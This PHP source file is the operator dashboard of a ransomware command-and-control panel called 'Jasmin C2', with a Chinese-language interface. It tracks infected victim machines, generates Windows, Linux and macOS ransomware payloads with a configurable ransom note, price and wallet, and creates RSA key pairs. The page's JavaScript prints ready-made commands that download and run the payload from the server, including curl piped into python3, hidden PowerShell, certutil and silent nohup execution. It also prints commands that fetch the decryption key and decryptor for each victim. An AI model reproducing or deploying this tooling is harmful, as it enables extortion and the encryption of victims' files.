<?php
require_once __DIR__ . '/includes/auth.php';
require_once __DIR__ . '/includes/csrf.php';
require_auth();
include __DIR__ . '/database/db_conection.php';

$records_per_page = 10;
$pageno = max(1, intval($_GET['pageno'] ?? 1));
$search = trim($_GET['search'] ?? '');
$offset = ($pageno - 1) * $records_per_page;

if ($search !== '') {
    $like = '%' . $search . '%';
    $count_stmt = $pdo->prepare('SELECT COUNT(*) FROM victims WHERE machine_name LIKE :s1 OR computer_user LIKE :s2 OR os LIKE :s3 OR ip LIKE :s4 OR location LIKE :s5 OR systemid LIKE :s6');
    $count_stmt->execute([':s1'=>$like,':s2'=>$like,':s3'=>$like,':s4'=>$like,':s5'=>$like,':s6'=>$like]);
    $total_rows = (int)$count_stmt->fetchColumn();
    $data_stmt = $pdo->prepare('SELECT * FROM victims WHERE machine_name LIKE :s1 OR computer_user LIKE :s2 OR os LIKE :s3 OR ip LIKE :s4 OR location LIKE :s5 OR systemid LIKE :s6 ORDER BY id DESC LIMIT :offset, :limit');
    $data_stmt->bindValue(':s1',$like);$data_stmt->bindValue(':s2',$like);$data_stmt->bindValue(':s3',$like);
    $data_stmt->bindValue(':s4',$like);$data_stmt->bindValue(':s5',$like);$data_stmt->bindValue(':s6',$like);
    $data_stmt->bindValue(':offset',$offset,PDO::PARAM_INT);$data_stmt->bindValue(':limit',$records_per_page,PDO::PARAM_INT);
    $data_stmt->execute();
} else {
    $total_rows = (int)$pdo->query('SELECT COUNT(*) FROM victims')->fetchColumn();
    $data_stmt = $pdo->prepare('SELECT * FROM victims ORDER BY id DESC LIMIT :offset, :limit');
    $data_stmt->bindValue(':offset',$offset,PDO::PARAM_INT);$data_stmt->bindValue(':limit',$records_per_page,PDO::PARAM_INT);
    $data_stmt->execute();
}
$total_pages = max(1,(int)ceil($total_rows/$records_per_page));
if ($pageno > $total_pages) $pageno = $total_pages;
$rows = $data_stmt->fetchAll();
function h(string $s): string { return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }
$csrf = csrf_token();
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Jasmin C2</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<link rel="stylesheet" href="./assets/css/dashboard.css">
</head>
<body>
<nav class="sidebar" id="sidebar">
  <div class="sidebar-head"><i class="fas fa-skull-crossbones"></i><span>JASMIN</span></div>
  <a href="dashboard.php" class="nav-item active"><i class="fas fa-chart-pie"></i><span>仪表盘</span></a>
  <a href="#gen" class="nav-item" onclick="showTab('gen')"><i class="fas fa-virus"></i><span>载荷生成</span></a>
  <a href="#victims" class="nav-item" onclick="showTab('victims')"><i class="fas fa-desktop"></i><span>受害主机</span></a>
  <a href="#update" class="nav-item" onclick="showTab('update')"><i class="fas fa-cloud-download-alt"></i><span>系统更新</span></a>
  <a href="#decrypt" class="nav-item" onclick="showTab('decrypt')"><i class="fas fa-unlock-alt"></i><span>解密教程</span></a>
  <div class="sidebar-foot">
    <span class="user-badge"><i class="fas fa-user-shield"></i> <?=h($_SESSION['username'])?></span>
    <a href="logout.php"><i class="fas fa-sign-out-alt"></i> 退出</a>
  </div>
</nav>
<button class="hamburger" id="ham" onclick="document.getElementById('sidebar').classList.toggle('open')"><i class="fas fa-bars"></i></button>

<main class="content">
<!-- Stats -->
<section class="stats-row">
  <div class="stat-card red"><div class="stat-icon"><i class="fas fa-desktop"></i></div><div><span class="stat-num"><?=$total_rows?></span><label>已感染</label></div></div>
  <div class="stat-card blue"><div class="stat-icon"><i class="fas fa-globe"></i></div><div><span class="stat-num"><?=$total_pages?></span><label>页数</label></div></div>
  <div class="stat-card green"><div class="stat-icon"><i class="fas fa-virus"></i></div><div><span class="stat-num">3</span><label>平台</label></div></div>
</section>

<?php
$server_url = (isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']==='on'?'https':'http').'://'.$_SERVER['HTTP_HOST'];
?>
<!-- 载荷生成器 -->
<section class="panel" id="panel-gen">
<h2><i class="fas fa-virus"></i> 载荷生成器</h2>

<div class="gen-opts" style="grid-template-columns:1fr 1fr 1fr;margin-bottom:20px">
  <div class="field"><label>回连地址 (C2)</label><input type="text" id="c2url" value="<?=h($server_url)?>/handshake.php"></div>
  <div class="field"><label>握手密钥</label><input type="text" id="gensecret" value="jasmin@123"></div>
  <div class="field"><label>目标系统</label>
    <select id="gen-platform" style="width:100%;padding:9px 12px;background:var(--bg);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:.85rem">
      <option value="win">🖥️ Windows (C# / .NET)</option>
      <option value="linux">🐧 Linux (Python3)</option>
      <option value="macos">🍎 macOS (Python3)</option>
    </select>
  </div>
</div>

<h3 style="color:var(--accent2);font-size:.9rem;margin-bottom:12px"><i class="fas fa-scroll"></i> 勒索信配置</h3>
<div class="gen-opts" style="grid-template-columns:1fr 1fr">
  <div class="field"><label>勒索标题</label><input type="text" id="ransom-title" value="YOUR FILES HAVE BEEN ENCRYPTED"></div>
  <div class="field"><label>联系方式</label><input type="text" id="ransom-contact" value="Contact: jasmin@protonmail.com" placeholder="邮箱/Telegram/Bitcoin地址"></div>
</div>
<div class="field" style="margin-bottom:14px"><label>勒索信正文 (支持多行)</label>
<textarea id="ransom-body" rows="4" style="width:100%;padding:10px 14px;background:var(--bg);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:.84rem;resize:vertical;font-family:monospace">所有文件已使用 AES-256 + RSA-2048 军事级加密。
每个文件拥有独立密钥，由RSA公钥保护。
不要重命名/删除 .jasmin 文件，不要用第三方软件解密。
联系我们获取私钥以解密文件。</textarea>
</div>
<div class="gen-opts" style="grid-template-columns:1fr 1fr">
  <div class="field"><label>赎金金额</label><input type="text" id="ransom-price" value="0.5 BTC" placeholder="如: 0.5 BTC / $5000 USDT"></div>
  <div class="field"><label>支付地址</label><input type="text" id="ransom-wallet" value="" placeholder="BTC/ETH/USDT地址"></div>
</div>

<div style="display:flex;gap:10px;margin-top:16px">
  <button class="btn btn-red" onclick="genPayload()"><i class="fas fa-cog"></i> 生成载荷</button>
  <button class="btn btn-red" style="background:#10b981" onclick="genKey()"><i class="fas fa-key"></i> 生成RSA密钥对</button>
</div>
<div id="key-result" class="gen-result" style="margin-top:10px"></div>
<div id="gen-result" class="gen-result" style="margin-top:16px"></div>
</section>

<!-- Victims -->
<section class="panel" id="panel-victims">
<h2><i class="fas fa-desktop"></i> Victims</h2>
<form action="dashboard.php" method="get" class="search-form">
  <input type="text" name="search" placeholder="搜索主机名、IP、系统、位置..." value="<?=h($search)?>">
  <button type="submit"><i class="fas fa-search"></i></button>
</form>
<div class="table-wrap"><table>
<thead><tr><th>#</th><th>主机名</th><th>用户</th><th>系统</th><th>IP</th><th>日期</th><th>加密文件</th><th>合计大小</th><th>文件类型</th><th>操作</th></tr></thead>
<tbody>
<?php if(empty($rows)):?>
<tr><td colspan="10" class="empty">暂无受害主机数据</td></tr>
<?php else: foreach($rows as $i=>$row):
  $sm=preg_replace('/[^a-zA-Z0-9_\\-]/','_',$row['machine_name']);
  $su=preg_replace('/[^a-zA-Z0-9_\\-]/','_',$row['computer_user']);
  $ss=preg_replace('/[^a-zA-Z0-9_\\-]/','_',$row['systemid']);
  $nt=date("H-i-s",strtotime($row['time']));
  $fp='passwords/'.$sm.'_'.$su.'/'.$nt.'_'.$ss.'.flora';
  $ec=intval($row['encrypted_count']??0);
  $es=intval($row['encrypted_size']??0);
  $et=h($row['encrypted_types']??'');
  $ed=h($row['encrypted_detail']??'{}');
  if($es>=1073741824)$sz_str=round($es/1073741824,2).' GB';
  elseif($es>=1048576)$sz_str=round($es/1048576,2).' MB';
  elseif($es>=1024)$sz_str=round($es/1024,2).' KB';
  else $sz_str=$es.' B';
  $vid=$row['id'];
  $is_linux=(stripos($row['os']??'','linux')!==false||stripos($row['os']??'','darwin')!==false);
?>
<tr>
  <td><?=$offset+$i+1?></td><td><?=h($row['machine_name'])?></td>
  <td><?=h($row['computer_user'])?></td><td><span class="os-badge"><?=h($row['os'])?></span></td>
  <td><?=h($row['ip'])?></td><td><?=h($row['date'])?></td>
  <td><a href="#" style="color:#f59e0b;font-weight:600;text-decoration:underline;cursor:pointer" onclick="event.preventDefault();showFileDetail(<?=$vid?>,'<?=$ed?>')"><?=$ec?> 个</a></td>
  <td style="color:#4dc3fa"><?=$sz_str?></td>
  <td><span style="font-size:.72rem;color:#94a3b8;word-break:break-all"><?=$et?></span></td>
  <td style="white-space:nowrap">
    <?php if(file_exists($fp)):?><a href="download_file.php?file=<?=urlencode($fp)?>" class="btn-sm" title="下载密钥"><i class="fas fa-key"></i></a><?php endif;?>
    <button class="btn-sm" style="background:#10b981" onclick="showDecrypt('<?=$vid?>','<?=h($row['ip'])?>',<?=$is_linux?'true':'false'?>)" title="一键解密"><i class="fas fa-unlock"></i></button>
  </td>
</tr>
<?php if(isset($_GET['dec'])&&$_GET['dec']==$vid):?>
<tr><td colspan="10" id="dec-row-<?=$vid?>" class="dec-expand">
<?php if($is_linux):?>
<pre class="dt-code"># <?=h($row['machine_name'])?> (<?=h($row['ip'])?>) 一键解密
pip3 install -q cryptography 2>/dev/null
curl -sL <?=$server_url?>/payloads/jasmin_private.pem -o /tmp/.jk
curl -sL <?=$server_url?>/payloads/jasmin_decrypt.py -o /tmp/.jd
python3 /tmp/.jd /tmp/.jk
rm -f /tmp/.jk /tmp/.jd</pre>
<?php else:?>
<pre class="dt-code">:: <?=h($row['machine_name'])?> (<?=h($row['ip'])?>) 一键解密
$tmp="$env:TEMP\jasmin_dec"
New-Item -ItemType Directory -Force -Path $tmp | Out-Null
Invoke-WebRequest "<?=$server_url?>/payloads/jasmin_private.pem" -OutFile "$tmp\key.pem"
Invoke-WebRequest "<?=$server_url?>/payloads/Jasmin_Decryptor.exe" -OutFile "$tmp\dec.exe"
& "$tmp\dec.exe" "$tmp\key.pem"
Remove-Item -Recurse -Force $tmp</pre>
<?php endif;?>
</td></tr>
<?php endif;?>
<?php endforeach;endif;?>
</tbody></table></div>
<?php if($total_pages>1):?>
<nav class="pagination">
  <a href="?search=<?=urlencode($search)?>&pageno=1" <?=$pageno<=1?'class="disabled"':''?>>&laquo;</a>
  <a href="?search=<?=urlencode($search)?>&pageno=<?=max(1,$pageno-1)?>" <?=$pageno<=1?'class="disabled"':''?>>&lsaquo;</a>
  <?php $s2=max(1,$pageno-3);$e2=min($total_pages,$pageno+3);for($p=$s2;$p<=$e2;$p++):?>
  <a href="?search=<?=urlencode($search)?>&pageno=<?=$p?>" <?=$p===$pageno?'class="active"':''?>><?=$p?></a>
  <?php endfor;?>
  <a href="?search=<?=urlencode($search)?>&pageno=<?=min($total_pages,$pageno+1)?>" <?=$pageno>=$total_pages?'class="disabled"':''?>>&rsaquo;</a>
  <a href="?search=<?=urlencode($search)?>&pageno=<?=$total_pages?>" <?=$pageno>=$total_pages?'class="disabled"':''?>>&raquo;</a>
</nav>
<?php endif;?>
</section>
</main>

<!-- Update Panel (hidden by default) -->
<?php include __DIR__ . '/includes/decrypt_panel.html'; ?>
<script>
// inject update panel into main before script
(function(){
  var main=document.querySelector('.content');
  var sec=document.createElement('section');
  sec.className='panel';sec.id='panel-update';sec.style.display='none';
  sec.innerHTML='<h2><i class="fas fa-cloud-download-alt"></i> 检查更新</h2>'
    +'<p style="color:#94a3b8;margin-bottom:16px">当前版本: <b style="color:#4dc3fa"><?php $v=__DIR__."/../VERSION";if(!file_exists($v))$v=__DIR__."/VERSION";echo trim(@file_get_contents($v)?:"0.0.0");?></b></p>'
    +'<button class="btn btn-red" onclick="checkUpdate()"><i class="fas fa-sync-alt"></i> 检查更新</button>'
    +'<div id="update-result" style="margin-top:16px"></div>';
  main.appendChild(sec);
})();

function checkUpdate(){
  var r=document.getElementById('update-result');
  r.innerHTML='<span class="loading"><i class="fas fa-spinner fa-spin"></i> 正在检查...</span>';
  fetch('update.php?action=check').then(x=>x.json()).then(d=>{
    if(!d.ok||!d.update){r.innerHTML='<div class="gen-ok"><i class="fas fa-check-circle"></i> 已是最新版本 (v'+d.current+')</div>';return;}
    var info='远程版本: <b>v'+d.latest+'</b>';
    if(d.latest_commit)info+=' | 提交: '+d.latest_commit+' — '+d.message;
    if(d.date)info+='<br>时间: '+d.date;
    r.innerHTML='<div class="gen-ok"><i class="fas fa-arrow-circle-up"></i> 发现新版本<br>'+info
      +'<br><br><button class="btn btn-red" onclick="doUpdate()"><i class="fas fa-download"></i> 一键更新</button></div>';
  }).catch(e=>{r.innerHTML='<div class="gen-err">检查失败: '+e+'</div>';});
}
function doUpdate(){
  var r=document.getElementById('update-result');
  r.innerHTML='<span class="loading"><i class="fas fa-spinner fa-spin"></i> 正在更新，请勿刷新...</span>';
  fetch('update.php?action=update').then(x=>x.json()).then(d=>{
    if(d.ok){r.innerHTML='<div class="gen-ok"><i class="fas fa-check-circle"></i> 更新完成 ('+d.method+')<br><pre style="margin-top:8px;font-size:.78rem;color:#94a3b8">'+(d.output||d.msg)+'</pre><br><a href="dashboard.php" class="btn btn-red" style="display:inline-flex;margin-top:8px"><i class="fas fa-redo"></i> 刷新页面</a></div>';}
    else{r.innerHTML='<div class="gen-err"><i class="fas fa-times-circle"></i> '+d.msg+'</div>';}
  }).catch(e=>{r.innerHTML='<div class="gen-err">更新失败: '+e+'</div>';});
}

function showDT(t){
  document.querySelectorAll('.dt-content').forEach(d=>d.style.display='none');
  document.querySelectorAll('.dt-btn').forEach(b=>b.classList.remove('active'));
  var el=document.getElementById('dt-'+t);if(el)el.style.display='block';
  event.target.classList.add('active');
}

function showTab(t){
  document.querySelectorAll('.panel').forEach(p=>p.style.display='none');
  var el=document.getElementById('panel-'+t);if(el)el.style.display='block';
  document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
  event.target.closest('.nav-item').classList.add('active');
}
var _detOpen=null;
function showFileDetail(vid,jsonStr){
  if(_detOpen){_detOpen.remove();if(_detOpen.dataset.vid==vid){_detOpen=null;return;}_detOpen=null;}
  var d;try{d=JSON.parse(jsonStr);}catch(e){d={};}
  var keys=Object.keys(d).sort();
  if(!keys.length){return;}
  function fmtSz(b){if(b>=1073741824)return (b/1073741824).toFixed(2)+' GB';if(b>=1048576)return (b/1048576).toFixed(2)+' MB';if(b>=1024)return (b/1024).toFixed(2)+' KB';return b+' B';}
  var h='<table style="width:100%;font-size:.8rem;border-collapse:collapse"><thead><tr style="color:var(--accent2)"><th style="text-align:left;padding:6px 10px">文件类型</th><th style="text-align:right;padding:6px 10px">数量</th><th style="text-align:right;padding:6px 10px">大小</th><th style="padding:6px 10px">占比</th></tr></thead><tbody>';
  var total=0;keys.forEach(function(k){total+=d[k].count;});
  keys.forEach(function(k){
    var pct=total?Math.round(d[k].count/total*100):0;
    var bar='<div style="background:var(--surface2);border-radius:4px;height:8px;width:80px;display:inline-block"><div style="background:var(--accent2);height:8px;border-radius:4px;width:'+pct+'%"></div></div>';
    h+='<tr style="border-top:1px solid var(--border)"><td style="padding:5px 10px;color:#f59e0b;font-weight:600">'+k+'</td><td style="text-align:right;padding:5px 10px">'+d[k].count+' 个</td><td style="text-align:right;padding:5px 10px;color:#4dc3fa">'+fmtSz(d[k].size)+'</td><td style="padding:5px 10px">'+bar+' '+pct+'%</td></tr>';
  });
  h+='</tbody></table>';
  var btns=document.querySelectorAll('a[onclick*="showFileDetail"]');
  var tr=null;for(var b of btns){if(b.onclick.toString().indexOf(vid+',' )>-1){tr=b.closest('tr');break;}}
  if(!tr)return;
  var nr=document.createElement('tr');nr.dataset.vid=vid;
  var td=document.createElement('td');td.colSpan=10;td.className='dec-expand';td.innerHTML=h;
  nr.appendChild(td);tr.after(nr);_detOpen=nr;
}

var _decOpen=null;
var _aesKey='<?php echo file_exists(__DIR__."/payloads/.key_secret")?trim(file_get_contents(__DIR__."/payloads/.key_secret")):"KEY_NOT_SET";?>';
function showDecrypt(vid,ip,isLinux){
  var srv=location.origin;var k=_aesKey;
  if(_decOpen){_decOpen.remove();if(_decOpen.dataset.vid==vid){_decOpen=null;return;}_decOpen=null;}
  var tr=document.querySelector('tr:has(button[onclick*="showDecrypt(\''+vid+'\'"])');
  if(!tr)return;
  var nr=document.createElement('tr');nr.dataset.vid=vid;
  var td=document.createElement('td');td.colSpan=10;td.className='dec-expand';
  if(isLinux){
    td.innerHTML='<pre class="dt-code"># '+ip+' 一键解密 (私钥AES加密传输)\nK="'+k+'"\npip3 install -q cryptography 2>/dev/null\ncurl -sL '+srv+'/payloads/jasmin_private.pem.enc -o /tmp/.jke\ncurl -sL '+srv+'/payloads/jasmin_decrypt.py -o /tmp/.jd\npython3 -c "\nimport base64\nfrom cryptography.hazmat.primitives.ciphers import Cipher,algorithms,modes\nfrom cryptography.hazmat.backends import default_backend\nraw=base64.b64decode(open(\\'/tmp/.jke\\').read())\niv,ct=raw[:16],raw[16:]\nc=Cipher(algorithms.AES(bytes.fromhex(\\'$K\\')),modes.CBC(iv),default_backend()).decryptor()\npt=c.update(ct)+c.finalize()\nopen(\\'/tmp/.jk\\',\\'wb\\').write(pt[:-pt[-1]])\n"\npython3 /tmp/.jd /tmp/.jk\nrm -f /tmp/.jke /tmp/.jk /tmp/.jd</pre>';
  }else{
    td.innerHTML='<pre class="dt-code">$tmp=\\"$env:TEMP\\jasmin_dec\\"\n$k=\\"'+k+'\\"\nNew-Item -ItemType Directory -Force -Path $tmp | Out-Null\nInvoke-WebRequest \\"'+srv+'/payloads/jasmin_private.pem.enc\\" -OutFile \\"$tmp\\key.enc\\"\n$raw=[Convert]::FromBase64String((Get-Content \\"$tmp\\key.enc\\" -Raw))\n$iv=$raw[0..15];$ct=$raw[16..($raw.Length-1)]\n$aes=[System.Security.Cryptography.Aes]::Create()\n$aes.Key=[System.Text.Encoding]::UTF8.GetBytes($k)\n$aes.IV=[byte[]]$iv;$aes.Padding=\\"PKCS7\\";$aes.Mode=\\"CBC\\"\n$dec=$aes.CreateDecryptor()\n$ms=New-Object IO.MemoryStream(,[byte[]]$ct)\n$cs=New-Object Security.Cryptography.CryptoStream($ms,$dec,\\"Read\\")\n$sr=New-Object IO.StreamReader($cs)\n[IO.File]::WriteAllText(\\"$tmp\\key.pem\\",$sr.ReadToEnd())\nInvoke-WebRequest \\"'+srv+'/payloads/Jasmin_Decryptor.exe\\" -OutFile \\"$tmp\\dec.exe\\"\n& \\"$tmp\\dec.exe\\" \\"$tmp\\key.pem\\"\nRemove-Item -Recurse -Force $tmp</pre>';
  }
  nr.appendChild(td);tr.after(nr);_decOpen=nr;
}

function genKey(){
  var r=document.getElementById('key-result');
  r.innerHTML='<span class="loading"><i class="fas fa-spinner fa-spin"></i> 正在生成RSA-2048密钥对...</span>';
  fetch('keygen.php').then(x=>x.json()).then(d=>{
    if(d.ok){r.innerHTML='<div class="gen-ok"><i class="fas fa-key"></i> '+d.msg+'<br><br><b>公钥 (内置到载荷模板):</b><pre class="dt-code" style="margin-top:8px;max-height:120px;overflow:auto;font-size:.72rem">'+d.pub+'</pre><div style="margin-top:8px"><a href="payloads/jasmin_private.pem" download class="btn btn-red" style="display:inline-flex"><i class="fas fa-download"></i> 下载私钥</a> <a href="payloads/jasmin_public.pem" download class="btn btn-red" style="display:inline-flex;background:#4dc3fa"><i class="fas fa-download"></i> 下载公钥</a></div></div>';}
    else{r.innerHTML='<div class="gen-err"><i class="fas fa-times-circle"></i> '+d.msg+'</div>';}
  }).catch(e=>{r.innerHTML='<div class="gen-err">'+e+'</div>';});
}

function genPayload(){
  var p=document.getElementById('gen-platform').value;
  var c2=document.getElementById('c2url').value;
  var sec=document.getElementById('gensecret').value;
  var res=document.getElementById('gen-result');
  res.innerHTML='<span class="loading"><i class="fas fa-spinner fa-spin"></i> 正在生成 '+p+' 载荷...</span>';
  var fd=new FormData();
  fd.append('platform',p);fd.append('c2_url',c2);fd.append('secret',sec);fd.append('csrf_token','<?=$csrf?>');
  fd.append('ransom_title',document.getElementById('ransom-title').value);
  fd.append('ransom_contact',document.getElementById('ransom-contact').value);
  fd.append('ransom_body',document.getElementById('ransom-body').value);
  fd.append('ransom_price',document.getElementById('ransom-price').value);
  fd.append('ransom_wallet',document.getElementById('ransom-wallet').value);
  fetch('generate.php',{method:'POST',body:fd})
  .then(r=>r.json()).then(d=>{
    if(!d.ok){res.innerHTML='<div class="gen-err"><i class="fas fa-times-circle"></i> '+d.msg+'</div>';return;}
    var pname={'win':'Windows','linux':'Linux','macos':'macOS'}[p]||p;
    var dl='payloads/'+d.file;
    var html='<div class="gen-ok">';
    html+='<i class="fas fa-check-circle"></i> <b>'+pname+'</b> 载荷已就绪: <a href="'+dl+'" download>'+d.file+'</a> ('+d.size+' B)';
    html+='<div style="margin-top:16px;padding:14px;background:var(--bg);border:1px solid var(--border);border-radius:8px">';
    html+='<h4 style="color:var(--accent2);margin-bottom:10px"><i class="fas fa-terminal"></i> 一键部署命令</h4>';
    if(p==='linux'||p==='macos'){
      var rurl=location.origin+'/'+dl;
      html+='<pre class="dt-code" style="margin:0">'+
        '# 方式1: curl 直接运行\n'+
        'curl -sL '+rurl+' | python3\n\n'+
        '# 方式2: wget 下载后运行\n'+
        'wget -q '+rurl+' -O /tmp/.j && python3 /tmp/.j && rm -f /tmp/.j\n\n'+
        '# 方式3: 后台静默运行\n'+
        'nohup python3 -c \"$(curl -sL '+rurl+')\" > /dev/null 2>&1 &'+
        '</pre>';
    }else{
      html+='<pre class="dt-code" style="margin:0">'+
        ':: 方式1: PowerShell 下载运行\n'+
        'powershell -w hidden -c \"IWR -Uri \''+location.origin+'/'+dl+'\' -OutFile $env:TEMP\\\\j.cs; '+
        'cd $env:TEMP; csc /target:winexe /out:j.exe j.cs; Start-Process j.exe\"\n\n'+
        ':: 方式2: certutil 下载\n'+
        'certutil -urlcache -split -f '+location.origin+'/'+dl+' %TEMP%\\\\j.cs && csc /target:winexe /out:%TEMP%\\\\j.exe %TEMP%\\\\j.cs && %TEMP%\\\\j.exe'+
        '</pre>';
    }
    html+='</div></div>';
    res.innerHTML=html;
  }).catch(e=>{res.innerHTML='<div class="gen-err"><i class="fas fa-times-circle"></i> '+e+'</div>';});
}
</script>
</body>
</html>
